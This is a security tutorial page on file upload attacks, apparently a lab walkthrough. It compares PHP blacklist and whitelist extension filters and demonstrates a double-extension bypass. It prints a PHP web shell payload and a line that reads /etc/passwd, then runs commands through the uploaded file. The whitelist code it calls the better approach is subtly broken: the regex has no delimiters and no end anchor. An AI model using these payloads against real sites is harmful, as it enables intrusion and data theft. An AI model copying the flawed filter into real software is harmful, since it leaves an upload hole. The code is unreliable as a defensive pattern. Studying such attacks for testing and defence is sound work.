---
description: >-
  File upload vulnerabilities are amongst the most common vulnerabilities found
  in web and mobile applications.
---

# File upload attacks

{% embed url="https://www.youtube.com/watch?ab_channel=Hacksplaining&v=dRYy6gJBmyM" %}

### What is a file upload attack?

Uploading user files is a key feature in many web applications. Many websites have functionalities like uploading profile pictures or other files. If these inputs are not correctely filtered and validated attacker can exploit theses upload feature to upload malicious files which could result in remote code execution.

#### Blacklist filters

A weak form of validation is blacklisting extensions. This would block extensions like .php or .phar.&#x20;

{% code overflow="wrap" %}
```php
$fileName = basename($_FILES["uploadFile"]["name"]);
$extension = pathinfo($fileName, PATHINFO_EXTENSION);
$blacklist = array('php', 'php7', 'phps');

if (in_array($extension, $blacklist)) {
    echo "File type not allowed";
    die();
}
```
{% endcode %}

#### Whitelist filters

A better way of validation extensions is using whitelisting. This would only allow extensions that are specified.&#x20;

```php
$fileName = basename($_FILES["uploadFile"]["name"]);

if (!preg_match('^.*\.(jpg|jpeg|png|gif)', $fileName)) {
    echo "Only images are allowed";
    die();
}
```

#### Filter bypass

Filters can be bypassed using double extensions. Using burp and intercepting the request we can change `file.php` to `file.phar.php`  &#x20;

* [PHP extensions](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst)
* [ASP extensions ](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Extension%20ASP)
* [Web extensions](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt)

### Double extension example

Having a website with a file upload we try uploading a .php file but we get back "Invalid image file" meaning the extension is blocked.

<figure><img src="../.gitbook/assets/image (115).png" alt=""><figcaption></figcaption></figure>

To try and bypass this filter we try double extensions. This can be many things and takes time to find, it can either be fuzzing or using burp intruder. In this case the webapp is also checking mimetype. Mimetypes are signatures in files which consist of the first part of the file like PNG or GIF82a&#x20;

Payloads

* `<?php file_get_contents('/etc/passwd'); ?>`
* `<?php system($_REQUEST['cmd']); ?>`

We intercept the request and insert our payload into the image code leaving the Mimetype intact and changing filename to htb3.php.png.

<figure><img src="../.gitbook/assets/image (116).png" alt=""><figcaption></figcaption></figure>

The file got uploaded upon opening file we see unreadable code but our payload is in there so calling it with http://zencorp.com?cmd=id we get rce and data back.

<figure><img src="../.gitbook/assets/image (117).png" alt=""><figcaption></figcaption></figure>

